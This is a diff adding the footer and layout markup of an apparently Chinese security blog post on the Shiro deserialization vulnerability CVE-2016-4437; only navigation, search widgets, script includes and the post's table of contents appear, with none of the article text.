+        <!-- PC go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-text">shiro反序列化漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2016-4437-x2F-SHIRO-550"><span class="nav-text">CVE-2016-4437&#x2F;SHIRO-550</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A5%E5%8F%91%E7%8E%B0%E8%80%85%E7%9A%84%E8%A7%92%E5%BA%A6%E5%88%86%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="nav-text">以发现者的角度分析漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A0%E6%B3%95%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Transformer-%E6%8E%A2%E8%AE%A8"><span class="nav-text">无法反序列化Transformer[]探讨</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">漏洞利用</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+<!-- common -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local-search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- code-block -->
+
+
+<!-- lazyload -->
+
+
+<div class="">
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+            
+<script src="/js/post/copyright-info.js"></script>
+
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- category-page -->
+    
+
+    <!-- links-page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+
+
+</body>
+</html>
